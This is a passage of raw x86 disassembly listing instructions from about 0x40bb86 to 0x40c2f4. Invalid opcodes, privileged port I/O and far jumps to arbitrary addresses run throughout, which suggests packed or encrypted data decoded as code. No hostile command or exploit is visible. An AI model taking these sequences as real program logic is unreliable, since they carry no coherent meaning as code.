  40bb86:	adc    DWORD PTR [esi-0x67c112bc],ebp
  40bb8c:	rol    BYTE PTR [edi-0x27],0x81
  40bb90:	and    al,0x37
  40bb92:	cmp    DWORD PTR [esi],esi
  40bb94:	(bad)  
  40bb95:	jae    0x40bb2e
  40bb97:	lahf   
  40bb98:	rcl    BYTE PTR [ebp+0x50],cl
  40bb9b:	jnp    0x40bb54
  40bb9d:	leave  
  40bb9e:	sub    BYTE PTR ds:0xe8038877,al
  40bba4:	popf   
  40bba5:	aam    0x2a
  40bba7:	leave  
  40bba8:	aaa    
  40bba9:	outs   dx,BYTE PTR ds:[esi]
  40bbaa:	pop    edi
  40bbab:	and    BYTE PTR [eax],dh
  40bbad:	shl    dh,1
  40bbaf:	inc    BYTE PTR [eax+0x5dfd68ce]
  40bbb5:	ds jbe 0x40bbcc
  40bbb8:	mov    ecx,0x4e289d4b
  40bbbd:	sub    al,0xdc
  40bbbf:	dec    edi
  40bbc0:	ins    BYTE PTR es:[edi],dx
  40bbc1:	lods   eax,DWORD PTR ds:[esi]
  40bbc2:	mov    esp,0x60a081e5
  40bbc7:	dec    edi
  40bbc8:	ja     0x40bc29
  40bbca:	int3   
  40bbcb:	adc    BYTE PTR [eax-0x7e],al
  40bbce:	xchg   edx,eax
  40bbcf:	pop    es
  40bbd0:	add    eax,0x946f7a2d
  40bbd5:	(bad)  
  40bbd6:	in     eax,0xf4
  40bbd8:	loope  0x40bc4c
  40bbda:	jmp    0xfbcb:0x8f6ba56e
  40bbe1:	out    0x72,eax
  40bbe3:	cli    
  40bbe4:	inc    esi
  40bbe5:	pop    esi
  40bbe6:	and    eax,0xde4b0cf2
  40bbeb:	frstor [ecx-0x74]
  40bbee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbef:	test   eax,0x409e1397
  40bbf4:	jno    0x40bc16
  40bbf6:	sbb    edi,edi
  40bbf8:	push   ds
  40bbf9:	xor    BYTE PTR [esi+0x2870ce46],0xe5
  40bc00:	mov    ebp,0xe08f05f0
  40bc05:	not    DWORD PTR [edx-0x42933660]
  40bc0b:	inc    eax
  40bc0c:	push   0x65
  40bc0e:	jnp    0x40bbba
  40bc10:	cmp    BYTE PTR [ebp-0x2e],bl
  40bc13:	cmp    ch,BYTE PTR [ecx]
  40bc15:	cmp    ebp,esp
  40bc17:	fcomp  DWORD PTR [ebp+0x21]
  40bc1a:	sub    ch,dl
  40bc1c:	pop    esi
  40bc1d:	sar    dh,cl
  40bc1f:	cmp    dh,BYTE PTR [esi-0x51fb12d6]
  40bc25:	repz sub eax,0x4a0d1014
  40bc2b:	fidiv  DWORD PTR [edx+0x2985de81]
  40bc31:	popf   
  40bc32:	cmp    DWORD PTR [edx-0x1380111f],ecx
  40bc38:	and    ch,dh
  40bc3a:	and    ecx,DWORD PTR [eax-0x70f2fa7d]
  40bc40:	or     dh,bl
  40bc42:	out    dx,eax
  40bc43:	xlat   BYTE PTR ds:[ebx]
  40bc44:	mov    ch,0xeb
  40bc46:	fimul  WORD PTR [ecx]
  40bc48:	cmp    DWORD PTR [ecx+edi*4-0x2f],0xffffff87
  40bc4d:	fnstenv [ebp-0x1e]
  40bc50:	into   
  40bc51:	out    0x4a,eax
  40bc53:	and    dh,bh
  40bc55:	inc    eax
  40bc56:	pop    ecx
  40bc57:	cld    
  40bc58:	retf   0x7355
  40bc5b:	clc    
  40bc5c:	in     eax,0x30
  40bc5e:	jb     0x40bca8
  40bc60:	ss inc edx
  40bc62:	fiadd  DWORD PTR [edx-0x10]
  40bc65:	cwde   
  40bc66:	repz dec edi
  40bc68:	pop    esp
  40bc69:	mul    bh
  40bc6b:	pop    ecx
  40bc6c:	xor    esi,ecx
  40bc6e:	fcomp  st(1)
  40bc70:	out    0x4,eax
  40bc72:	clc    
  40bc73:	nop
  40bc74:	fst    QWORD PTR [ebx+0x5e763ebd]
  40bc7a:	call   0x64fa9ef2
  40bc7f:	xchg   edx,eax
  40bc80:	cwde   
  40bc81:	push   esp
  40bc82:	mov    dh,0x81
  40bc84:	enter  0x4554,0xb3
  40bc88:	ds mov edx,0x5aa8434b
  40bc8e:	scas   eax,DWORD PTR es:[edi]
  40bc8f:	lahf   
  40bc90:	mov    edx,0xf66a5901
  40bc95:	ret    
  40bc96:	sti    
  40bc97:	fcmovne st,st(5)
  40bc99:	mov    eax,0x932be8aa
  40bc9e:	fwait
  40bc9f:	cdq    
  40bca0:	xchg   edi,eax
  40bca1:	scas   eax,DWORD PTR es:[edi]
  40bca2:	cmp    BYTE PTR [edi],0x34
  40bca5:	ror    DWORD PTR [edx],1
  40bca7:	dec    edi
  40bca8:	cdq    
  40bca9:	xchg   ecx,eax
  40bcaa:	mov    ebx,DWORD PTR [ecx+0x7074bea0]
  40bcb0:	popf   
  40bcb1:	xor    dl,BYTE PTR [ebx]
  40bcb3:	push   esi
  40bcb4:	mov    ah,0x81
  40bcb6:	not    DWORD PTR [esp+eax*4]
  40bcb9:	rcl    DWORD PTR [ebx],1
  40bcbb:	scas   al,BYTE PTR es:[edi]
  40bcbc:	es push edx
  40bcbe:	jb     0x40bc63
  40bcc0:	pop    ss
  40bcc1:	je     0x40bcf6
  40bcc3:	push   ebp
  40bcc4:	retf   
  40bcc5:	loope  0x40bc5a
  40bcc7:	cmp    ebp,DWORD PTR [edi+0x50]
  40bcca:	xchg   ecx,eax
  40bccb:	gs (bad) 
  40bcce:	retf   0x3eda
  40bcd1:	jmp    0xf412:0x9754b26d
  40bcd8:	daa    
  40bcd9:	out    dx,eax
  40bcda:	push   cs
  40bcdb:	fstp   DWORD PTR [esp+ecx*4+0x2]
  40bcdf:	dec    ecx
  40bce0:	inc    ecx
  40bce1:	dec    ebp
  40bce2:	(bad)  
  40bce3:	xchg   ebp,eax
  40bce4:	fstp   QWORD PTR [esi+0x57]
  40bce7:	mov    ds:0x357cde6f,al
  40bcec:	dec    eax
  40bced:	cmp    ch,BYTE PTR [edi+0x57654692]
  40bcf3:	add    edi,DWORD PTR [edi-0x1914dc90]
  40bcf9:	add    DWORD PTR [ebx-0x34],ebx
  40bcfc:	pop    es
  40bcfd:	loope  0x40bd6e
  40bcff:	test   ah,0x0
  40bd02:	and    DWORD PTR [ebx],ecx
  40bd04:	xchg   esi,eax
  40bd05:	mov    al,ds:0x512232f3
  40bd0a:	les    eax,FWORD PTR [esp+eax*4]
  40bd0d:	pop    ecx
  40bd0e:	mov    DWORD PTR [edi-0x4a],ebx
  40bd11:	icebp  
  40bd12:	aaa    
  40bd13:	shl    ebx,1
  40bd15:	inc    ebx
  40bd16:	xor    bh,BYTE PTR [esi+0x161d146b]
  40bd1c:	test   dh,ah
  40bd1e:	xchg   esp,eax
  40bd1f:	jns    0x40bce2
  40bd21:	fisubr DWORD PTR [edi+0x38671de5]
  40bd27:	sub    esi,DWORD PTR [ecx-0xd]
  40bd2a:	fsub   st(2),st
  40bd2c:	mov    ds:0x2037c398,eax
  40bd31:	je     0x40bdb1
  40bd33:	pop    ebx
  40bd34:	and    eax,DWORD PTR [esi+0x5c]
  40bd37:	inc    esi
  40bd38:	and    BYTE PTR cs:[eax+edi*1],bl
  40bd3c:	jecxz  0x40bd22
  40bd3e:	xchg   ebx,eax
  40bd3f:	cs js  0x40bd7a
  40bd42:	lahf   
  40bd43:	pop    ebp
  40bd44:	rcr    DWORD PTR [ebx-0x4c],0xb3
  40bd48:	repnz push 0xffffff87
  40bd4b:	or     al,0xc7
  40bd4d:	rcr    DWORD PTR [ebp-0x3e],0x95
  40bd51:	inc    esi
  40bd52:	push   edx
  40bd53:	mov    gs,WORD PTR [edx+eax*1+0x54]
  40bd57:	xchg   cl,bh
  40bd59:	jmp    0x7d3710c9
  40bd5e:	clc    
  40bd5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd60:	bound  edx,QWORD PTR [eax]
  40bd62:	test   eax,0x4940c747
  40bd67:	sub    esp,0xffffffb2
  40bd6a:	sub    bh,BYTE PTR [eax]
  40bd6c:	mov    edi,0xd01fb0c8
  40bd71:	add    BYTE PTR [ebp+0x7a73773f],ah
  40bd77:	les    ebp,FWORD PTR [eax+0x24032d1d]
  40bd7d:	aas    
  40bd7e:	in     eax,dx
  40bd7f:	lods   ax,WORD PTR ds:[esi]
  40bd81:	mov    eax,DWORD PTR [ebp+0x1eb1d5b1]
  40bd87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd88:	jae    0x40bdeb
  40bd8a:	aad    0x7
  40bd8c:	mov    cl,0x6
  40bd8e:	enter  0xf5f8,0xcd
  40bd92:	out    0xae,eax
  40bd94:	push   0x15c4f07d
  40bd99:	je     0x40bd31
  40bd9b:	xor    eax,0xc1c52794
  40bda0:	sub    al,0x50
  40bda2:	xchg   BYTE PTR [edi],al
  40bda4:	cwde   
  40bda5:	es sbb cl,al
  40bda8:	cs push 0x22c0c2ed
  40bdae:	xchg   ecx,eax
  40bdaf:	pop    esp
  40bdb0:	imul   ecx,DWORD PTR cs:[ecx+0x23],0x4ff7d948
  40bdb8:	add    BYTE PTR [edx+0x1e6b20a1],dl
  40bdbe:	pop    esi
  40bdbf:	int3   
  40bdc0:	mov    ebp,0x7e0a06fa
  40bdc5:	(bad)  
  40bdc6:	out    0xfe,eax
  40bdc8:	xor    bl,BYTE PTR [ebx+edi*4+0x5f]
  40bdcc:	mov    al,0xb3
  40bdce:	cmp    al,0x56
  40bdd0:	push   ebx
  40bdd1:	or     ecx,ebx
  40bdd3:	jo     0x40bd83
  40bdd5:	ret    
  40bdd6:	out    dx,al
  40bdd7:	sub    BYTE PTR [ecx-0x5df4d301],al
  40bddd:	jp     0x40bd86
  40bddf:	jmp    0x40bdcc
  40bde1:	jecxz  0x40bd8d
  40bde3:	inc    esi
  40bde4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bde5:	(bad)  [esi]
  40bde7:	xchg   DWORD PTR [ebp-0x459b2221],edi
  40bded:	push   ebp
  40bdee:	ss push ebx
  40bdf0:	test   BYTE PTR [eax+0x6ef5431a],dh
  40bdf6:	fild   QWORD PTR gs:[eax]
  40bdf9:	cdq    
  40bdfa:	push   ecx
  40bdfb:	icebp  
  40bdfc:	add    eax,0x19743e17
  40be01:	mov    al,ds:0x6c5029bd
  40be06:	pop    ss
  40be07:	mov    eax,ds:0x6608b242
  40be0c:	and    esp,esp
  40be0e:	lea    eax,[eax-0x42]
  40be11:	outs   dx,BYTE PTR ds:[esi]
  40be12:	and    DWORD PTR [ebp+ebp*8-0x1c],esi
  40be16:	mov    ebp,DWORD PTR [edx+ebx*2]
  40be19:	std    
  40be1a:	xlat   BYTE PTR ds:[ebx]
  40be1b:	leave  
  40be1c:	adc    eax,DWORD PTR [edx+0x7426da8f]
  40be22:	jne    0x40bdba
  40be24:	mov    bh,0x15
  40be26:	xchg   edx,eax
  40be27:	xchg   ebx,eax
  40be28:	mov    eax,0x97e4c79a
  40be2d:	loop   0x40beae
  40be2f:	pushf  
  40be30:	stos   DWORD PTR es:[edi],eax
  40be31:	not    DWORD PTR [ebp+0x1d30c7cc]
  40be37:	inc    esi
  40be38:	rol    DWORD PTR [ebx+0x2deda870],cl
  40be3e:	ins    BYTE PTR es:[edi],dx
  40be3f:	loop   0x40be6a
  40be41:	mov    bh,0xa9
  40be43:	lock in al,dx
  40be45:	mov    al,ds:0x549fcb21
  40be4a:	or     al,0x7f
  40be4c:	fldlg2 
  40be4e:	arpl   WORD PTR [eax-0x2f],di
  40be51:	lods   eax,DWORD PTR ds:[esi]
  40be52:	mov    eax,0xf91d12b3
  40be57:	sahf   
  40be58:	loopne 0x40beb6
  40be5a:	mov    ah,0x8f
  40be5c:	lods   eax,DWORD PTR ds:[esi]
  40be5d:	mov    ds:0x1cdcb460,eax
  40be62:	mov    ch,0x16
  40be64:	mov    eax,ds:0xfa32f076
  40be69:	push   cs
  40be6a:	hlt    
  40be6b:	and    eax,0x60c0136f
  40be70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be71:	inc    ebp
  40be72:	popf   
  40be73:	stos   BYTE PTR es:[edi],al
  40be74:	jbe    0x40be88
  40be76:	push   eax
  40be77:	jae    0x40be89
  40be79:	sub    al,0x9b
  40be7b:	and    eax,0x344a6e1
  40be80:	(bad)  
  40be81:	bound  ebx,QWORD PTR [eax+0xe2d079a]
  40be87:	lds    esp,FWORD PTR [edi]
  40be89:	sub    DWORD PTR [eax-0x55c7fee6],0xffffffa8
  40be90:	icebp  
  40be91:	nop
  40be92:	fucomip st,st(3)
  40be94:	jecxz  0x40bef5
  40be96:	mov    edx,0x6f75d012
  40be9b:	shr    DWORD PTR [edi-0x3bcdf284],cl
  40bea1:	adc    esp,DWORD PTR ds:0xbf6faae6
  40bea7:	dec    ebp
  40bea8:	(bad)  
  40bea9:	mov    edi,0x5a90e47f
  40beae:	jl     0x40bf09
  40beb0:	push   ecx
  40beb1:	mov    eax,0xc5acaeed
  40beb6:	aam    0xaf
  40beb8:	mov    ecx,0xed5b1059
  40bebd:	mov    esi,0x6526f7d0
  40bec2:	mov    ch,0x86
  40bec4:	les    edx,FWORD PTR [esi]
  40bec6:	add    edx,DWORD PTR [ecx+ecx*4-0x7eccffd7]
  40becd:	sub    bl,BYTE PTR [ebp-0x2279091a]
  40bed3:	fstp   TBYTE PTR [ecx-0x2a9b173e]
  40bed9:	mov    WORD PTR [edi+0x1a],fs
  40bedc:	pop    es
  40bedd:	idiv   BYTE PTR [edx-0x78]
  40bee0:	push   es
  40bee1:	into   
  40bee2:	add    dh,dl
  40bee4:	shr    DWORD PTR [ebp+ebx*4-0x6],1
  40bee8:	inc    eax
  40bee9:	in     eax,dx
  40beea:	mov    ds:0xe8a4bbe9,eax
  40beef:	retf   
  40bef0:	gs mov al,0xbf
  40bef3:	dec    ecx
  40bef4:	pop    edi
  40bef5:	popf   
  40bef6:	in     eax,dx
  40bef7:	js     0x40bf19
  40bef9:	retf   
  40befa:	xchg   ebp,eax
  40befb:	sub    eax,0x3e95bb44
  40bf00:	test   dh,dl
  40bf02:	mov    edx,ebp
  40bf04:	bound  esp,QWORD PTR [ebx-0x68]
  40bf07:	xor    al,0x8c
  40bf09:	or     eax,0xbf87969d
  40bf0e:	mov    al,ds:0x780298b5
  40bf13:	in     al,0x41
  40bf15:	retf   0xcb5d
  40bf18:	pop    ss
  40bf19:	lahf   
  40bf1a:	mov    esp,0x2bdda4ca
  40bf1f:	in     eax,0x35
  40bf21:	out    dx,eax
  40bf22:	and    bl,BYTE PTR [eax]
  40bf24:	cmp    eax,0x9ad34498
  40bf29:	in     al,dx
  40bf2a:	xchg   BYTE PTR [ebx+0x22],dl
  40bf2d:	iret   
  40bf2e:	bnd jae 0x40bf2d
  40bf31:	add    DWORD PTR [ebp+0x4a],edi
  40bf34:	xor    DWORD PTR ds:[edx-0x41],esp
  40bf38:	fs jo  0x40bf41
  40bf3b:	pop    es
  40bf3c:	sbb    bh,ah
  40bf3e:	mov    ch,0x45
  40bf40:	pop    edi
  40bf41:	push   edx
  40bf42:	jbe    0x40becf
  40bf44:	daa    
  40bf45:	cmp    al,0x7b
  40bf47:	push   esi
  40bf48:	lahf   
  40bf49:	lea    ebp,[edi+esi*4-0x2]
  40bf4d:	inc    esp
  40bf4e:	jl     0x40bf0c
  40bf50:	fld    TBYTE PTR [edx+0x3]
  40bf53:	jae    0x40bfc4
  40bf55:	popf   
  40bf56:	or     ecx,DWORD PTR [esi]
  40bf58:	sahf   
  40bf59:	test   bl,0xc5
  40bf5c:	mov    eax,ds:0x7c21d1f3
  40bf61:	xor    DWORD PTR [edx+0x46],edx
  40bf64:	lea    edi,[esi+0x77852077]
  40bf6a:	mov    ebx,0xaa0c560c
  40bf6f:	popa   
  40bf70:	xor    eax,DWORD PTR [eax]
  40bf72:	push   0x3cae407d
  40bf77:	jbe    0x40bfde
  40bf79:	dec    ebx
  40bf7a:	jp     0x40bfa5
  40bf7c:	cmp    DWORD PTR [ecx-0x77],ecx
  40bf7f:	cmc    
  40bf80:	fstp   TBYTE PTR [esi+0x79]
  40bf83:	repz mov dh,al
  40bf86:	cmp    eax,0xe5393e4c
  40bf8b:	call   0xc0ab:0x4cbb3b3d
  40bf92:	jne    0x40bf8e
  40bf94:	(bad)  
  40bf95:	popf   
  40bf96:	pushf  
  40bf97:	les    ecx,FWORD PTR [ecx]
  40bf99:	sbb    al,0xcc
  40bf9b:	mov    edi,0x34da50d6
  40bfa0:	push   0x2e
  40bfa2:	inc    edi
  40bfa3:	shl    BYTE PTR [ecx],cl
  40bfa5:	rcr    BYTE PTR [ebp+0xf3cb632],1
  40bfab:	sbb    edx,DWORD PTR [esi+0x28]
  40bfae:	add    DWORD PTR [ebx],esp
  40bfb0:	push   ds
  40bfb1:	fisubr DWORD PTR [ebx-0x20a25ea1]
  40bfb7:	popa   
  40bfb8:	stos   BYTE PTR es:[edi],al
  40bfb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfba:	and    eax,0xfdaf2ee
  40bfbf:	pop    eax
  40bfc0:	adc    eax,0x110b6ca3
  40bfc5:	jg     0x40c03c
  40bfc7:	push   0xd3e988d
  40bfcc:	jo     0x40c02e
  40bfce:	xchg   ebp,eax
  40bfcf:	jae    0x40bf68
  40bfd1:	in     eax,0x87
  40bfd3:	xor    esp,edx
  40bfd5:	mov    ?,edi
  40bfd7:	or     dh,0x66
  40bfda:	add    al,0x95
  40bfdc:	ja     0x40bfdd
  40bfde:	out    0x96,al
  40bfe0:	fwait
  40bfe1:	les    esp,FWORD PTR [ecx]
  40bfe3:	dec    eax
  40bfe4:	shl    DWORD PTR [ecx-0x297e45b9],cl
  40bfea:	not    DWORD PTR [ebp+0x29]
  40bfed:	not    DWORD PTR [esi]
  40bfef:	out    dx,eax
  40bff0:	dec    edi
  40bff1:	(bad)  
  40bff2:	in     al,0xe5
  40bff4:	and    eax,0xf207c83f
  40bff9:	stos   BYTE PTR es:[edi],al
  40bffa:	adc    al,0x94
  40bffc:	xchg   esp,eax
  40bffd:	pop    ecx
  40bffe:	arpl   bx,cx
  40c000:	push   ebx
  40c001:	xchg   esp,eax
  40c002:	push   cs
  40c003:	and    DWORD PTR [eax+0x5f17dd27],0x10
  40c00a:	mov    edx,0x4aadff48
  40c00f:	pop    edx
  40c010:	and    ch,al
  40c012:	mov    eax,ds:0x4ec40d0e
  40c017:	(bad)  
  40c018:	xor    eax,0xa312fbac
  40c01d:	inc    ebp
  40c01e:	sti    
  40c01f:	call   0x21532a7c
  40c024:	dec    eax
  40c025:	cmp    al,BYTE PTR [ecx]
  40c027:	cli    
  40c028:	test   eax,0x51d55012
  40c02d:	imul   ebp,eax,0xaa7d2ffa
  40c033:	or     BYTE PTR [edx+0xa71d5c3],dh
  40c039:	mov    esp,0xe82d65dc
  40c03e:	push   edx
  40c03f:	jb     0x40bfd8
  40c041:	dec    eax
  40c042:	cdq    
  40c043:	enter  0xd319,0x7d
  40c047:	or     edi,esi
  40c049:	lods   eax,DWORD PTR ds:[esi]
  40c04a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c04b:	mov    ecx,0x7fbdacb6
  40c050:	jb     0x40c00b
  40c052:	ret    0xbf5
  40c055:	outs   dx,BYTE PTR ds:[esi]
  40c056:	jmp    0x372c98d3
  40c05b:	je     0x40c0c6
  40c05d:	inc    eax
  40c05e:	mov    BYTE PTR [ebp-0x91e0103],bl
  40c064:	mov    eax,0x204e6150
  40c069:	sub    BYTE PTR [edi+0x2b],dl
  40c06c:	lea    ebx,[esi+0x1c]
  40c06f:	or     esp,DWORD PTR [edx]
  40c071:	and    DWORD PTR [ebp+0x5c],edi
  40c074:	ss xchg esi,eax
  40c076:	int    0x1f
  40c078:	mov    edx,0x1bfd3a70
  40c07d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c07e:	push   esi
  40c07f:	pop    ss
  40c080:	mov    ebp,0x7cf125a7
  40c085:	mov    ?,WORD PTR [esi-0x685dfdf]
  40c08b:	mov    bh,0x10
  40c08d:	dec    ebp
  40c08e:	jg     0x40c010
  40c090:	jo     0x40c064
  40c092:	das    
  40c093:	jno    0x40c085
  40c095:	inc    esp
  40c096:	dec    ecx
  40c097:	and    dh,BYTE PTR [edi]
  40c099:	std    
  40c09a:	xor    ebx,ecx
  40c09c:	jmp    0x1e2a99c1
  40c0a1:	dec    eax
  40c0a2:	test   DWORD PTR [edi],edi
  40c0a4:	cld    
  40c0a5:	cmp    DWORD PTR [ebx-0x47872b36],edi
  40c0ab:	and    BYTE PTR [ecx-0x3cae81ff],cl
  40c0b1:	in     eax,dx
  40c0b2:	lods   eax,DWORD PTR ds:[esi]
  40c0b3:	sbb    eax,DWORD PTR [edi+0x60]
  40c0b6:	mov    ds:0xf89ec6a7,al
  40c0bb:	clc    
  40c0bc:	add    BYTE PTR [edi-0xc44cfc8],al
  40c0c2:	adc    BYTE PTR [ebp+eiz*1+0x3f],0x8
  40c0c7:	repz or eax,0xbe56b33e
  40c0cd:	retf   0xd768
  40c0d0:	push   ebx
  40c0d1:	pushf  
  40c0d2:	or     eax,0x6ed3125a
  40c0d7:	sahf   
  40c0d8:	jp     0x40c0b7
  40c0da:	push   esp
  40c0db:	xorps  xmm6,XMMWORD PTR [eax+ecx*4-0x13cee019]
  40c0e3:	sbb    edx,DWORD PTR [ebx-0x5c]
  40c0e6:	or     eax,0xeaa5f466
  40c0eb:	adc    eax,0xdfe00c3e
  40c0f0:	jl     0x40c08b
  40c0f2:	outs   dx,BYTE PTR ds:[esi]
  40c0f3:	cmp    BYTE PTR gs:[ebx],0xf4
  40c0f7:	mov    esp,0xfc26d1a2
  40c0fc:	add    eax,0x8d324540
  40c101:	sub    dl,BYTE PTR [edx-0x6d7d53b9]
  40c107:	stos   DWORD PTR es:[edi],eax
  40c108:	ja     0x40c0ee
  40c10a:	sti    
  40c10b:	jne    0x40c0e6
  40c10d:	shl    BYTE PTR [esi-0x5c],0xd0
  40c111:	inc    edx
  40c112:	dec    esi
  40c113:	popa   
  40c114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c115:	pushf  
  40c116:	mov    edx,0xb165ba95
  40c11b:	push   ebp
  40c11c:	cli    
  40c11d:	std    
  40c11e:	in     al,0x9f
  40c120:	xchg   edx,eax
  40c121:	sti    
  40c122:	mul    DWORD PTR [ebx+edi*1-0x51]
  40c126:	fnsave [ecx-0x22]
  40c129:	and    bl,0x3f
  40c12c:	js     0x40c145
  40c12e:	inc    esi
  40c12f:	ret    
  40c130:	int    0xbd
  40c132:	in     al,dx
  40c133:	pop    edi
  40c134:	pop    edx
  40c135:	cwde   
  40c136:	iret   
  40c137:	retf   
  40c138:	sub    al,0xfd
  40c13a:	(bad)  
  40c13b:	pusha  
  40c13c:	in     al,0x92
  40c13e:	scas   eax,DWORD PTR es:[edi]
  40c13f:	ds pop edi
  40c141:	push   cs
  40c142:	xor    eax,0x681d4bb3
  40c147:	mov    ah,0x66
  40c149:	je     0x40c178
  40c14b:	ror    ebp,1
  40c14d:	lods   al,BYTE PTR ds:[esi]
  40c14e:	test   eax,0xd93a717
  40c153:	xchg   edx,eax
  40c154:	xchg   edx,eax
  40c155:	pop    ebp
  40c156:	cmp    al,0x40
  40c158:	pop    ecx
  40c159:	jbe    0x40c115
  40c15b:	dec    eax
  40c15c:	sub    BYTE PTR [esi-0x58],ch
  40c15f:	fdivp  st(2),st
  40c161:	ja     0x40c1bc
  40c163:	xchg   ecx,eax
  40c164:	lahf   
  40c165:	xor    eax,0xc11c6569
  40c16a:	daa    
  40c16b:	sar    DWORD PTR [edx-0x6d8e5884],1
  40c171:	push   eax
  40c172:	fimul  DWORD PTR [esi]
  40c174:	mov    esi,0x663a977c
  40c179:	jno    0x40c134
  40c17b:	xor    DWORD PTR [edi+eax*4],eax
  40c17e:	pminub mm3,QWORD PTR [edx+0x2e2c57ac]
  40c185:	add    dh,bl
  40c187:	jmp    0xcfbf7043
  40c18c:	cmp    BYTE PTR [edi+ecx*2+0x5f],dl
  40c190:	fisub  WORD PTR [edi-0x2e]
  40c193:	outs   dx,DWORD PTR ds:[esi]
  40c194:	shl    BYTE PTR [edx+0x2e],cl
  40c197:	pop    ds
  40c198:	push   ecx
  40c199:	mov    DWORD PTR [edi],0xfeb3479e
  40c19f:	mov    esp,DWORD PTR fs:[ecx-0xb]
  40c1a3:	repz cmp eax,DWORD PTR [eax-0x55217e3d]
  40c1aa:	int3   
  40c1ab:	das    
  40c1ac:	lea    ebx,[ecx-0x7950e7dc]
  40c1b2:	mov    edi,DWORD PTR [eax+0x76b10841]
  40c1b8:	dec    ebx
  40c1b9:	repnz dec edx
  40c1bb:	add    ecx,DWORD PTR [edx+0x228f405a]
  40c1c1:	test   esp,edx
  40c1c3:	imul   esp,DWORD PTR [ebx+ecx*1-0x56161f8b],0x74a0ad43
  40c1ce:	or     bh,BYTE PTR [edi]
  40c1d0:	(bad)  
  40c1d1:	xor    ch,BYTE PTR [ebx+0x5bbaaf3b]
  40c1d7:	fisubr WORD PTR [edx]
  40c1d9:	xchg   ebx,eax
  40c1da:	ja     0x40c1da
  40c1dc:	xor    eax,0x4dc89651
  40c1e1:	xor    eax,0x67a73661
  40c1e6:	retf   0xab47
  40c1e9:	jb     0x40c222
  40c1eb:	jne    0x40c1dc
  40c1ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1ee:	jmp    0x40c17b
  40c1f0:	std    
  40c1f1:	mov    ah,BYTE PTR [esi+edx*4-0x3a]
  40c1f5:	fisubr DWORD PTR [eax+0x4a]
  40c1f8:	arpl   WORD PTR [edx+0x37],bx
  40c1fb:	icebp  
  40c1fc:	mov    ah,0x11
  40c1fe:	shr    DWORD PTR [ecx],cl
  40c200:	mov    eax,0x45b7292e
  40c205:	mov    cl,0x52
  40c207:	fld    TBYTE PTR [eax]
  40c209:	dec    esp
  40c20a:	fild   QWORD PTR [esi+0x4ed31d5e]
  40c210:	mov    BYTE PTR [edi+0x37],cl
  40c213:	xchg   ah,dh
  40c215:	repnz rol BYTE PTR [edx+0x4e81892a],0x41
  40c21d:	rcr    DWORD PTR [ebp+0x5a48f450],0x36
  40c224:	xchg   ecx,eax
  40c225:	out    0xd0,eax
  40c227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c228:	sub    al,0xa5
  40c22a:	or     ecx,ecx
  40c22c:	fstp   TBYTE PTR [eax+0x4cd39daf]
  40c232:	jo     0x40c29f
  40c234:	pop    ss
  40c235:	fiadd  DWORD PTR [ebp+0x7db03793]
  40c23b:	call   0xe8c7:0xeb4418f1
  40c242:	jmp    0xc0ce7c6b
  40c247:	push   ecx
  40c248:	jbe    0x40c2b7
  40c24a:	and    BYTE PTR [ebx+0x3a8ccd8e],0x1f
  40c251:	aaa    
  40c252:	lods   al,BYTE PTR ds:[esi]
  40c253:	in     eax,dx
  40c254:	rcl    BYTE PTR [ecx+eiz*1],cl
  40c257:	sti    
  40c258:	sbb    al,0xf3
  40c25a:	mov    ds:0x4b0ace0e,eax
  40c25f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c260:	xor    bh,BYTE PTR ds:0xf390b70a
  40c266:	pop    ebp
  40c267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c268:	lahf   
  40c269:	sti    
  40c26a:	jns    0x40c29e
  40c26c:	fs jmp 0x1969:0xa048fa98
  40c274:	cmp    eax,0x9d486885
  40c279:	pop    edi
  40c27a:	les    ebp,FWORD PTR ss:[ebp+0x46]
  40c27e:	fwait
  40c27f:	inc    edx
  40c280:	popf   
  40c281:	pop    ecx
  40c282:	enter  0xc3d,0x8e
  40c286:	nop
  40c287:	pop    esp
  40c288:	pop    ebp
  40c289:	jecxz  0x40c276
  40c28b:	aas    
  40c28c:	aad    0x1a
  40c28e:	mov    edx,0x6d7784db
  40c293:	cmp    DWORD PTR [esi-0x5a],ebp
  40c296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c297:	dec    ebp
  40c298:	add    eax,0x81b9373f
  40c29d:	and    al,al
  40c29f:	push   eax
  40c2a0:	mov    bl,BYTE PTR [edx]
  40c2a2:	cmp    bh,dh
  40c2a4:	pop    edx
  40c2a5:	mov    BYTE PTR [eax-0x2e],cl
  40c2a8:	mov    ds:0xb622ec94,eax
  40c2ad:	ss sti 
  40c2af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2b0:	xchg   esi,eax
  40c2b1:	dec    edx
  40c2b2:	mov    eax,DWORD PTR [ebx-0x6bc5c0de]
  40c2b8:	(bad)  
  40c2b9:	les    ebx,FWORD PTR [ebp-0x71]
  40c2bc:	jae    0x40c261
  40c2be:	mov    dh,0xca
  40c2c0:	sbb    DWORD PTR [ebp-0x6b],esi
  40c2c3:	call   0xe22ee9b3
  40c2c8:	push   edx
  40c2c9:	mov    eax,0xa7b6ecf0
  40c2ce:	cmp    al,0x24
  40c2d0:	xchg   ebx,eax
  40c2d1:	out    dx,eax
  40c2d2:	pop    ebx
  40c2d3:	xchg   DWORD PTR [edx+0x351f3c26],ebp
  40c2d9:	mov    eax,0x38951aff
  40c2de:	loopne 0x40c330
  40c2e0:	xchg   esp,eax
  40c2e1:	(bad)  
  40c2e2:	in     eax,dx
  40c2e3:	adc    DWORD PTR [edx-0x7e],ebx
  40c2e6:	cmp    ebx,DWORD PTR [edx-0x6de9e53]
  40c2ec:	xor    cl,dh
  40c2ee:	xchg   edi,eax
  40c2ef:	(bad)  
  40c2f0:	scas   al,BYTE PTR es:[edi]
  40c2f1:	fcmovnb st,st(3)
  40c2f3:	push   ebx
  40c2f4:	sahf   
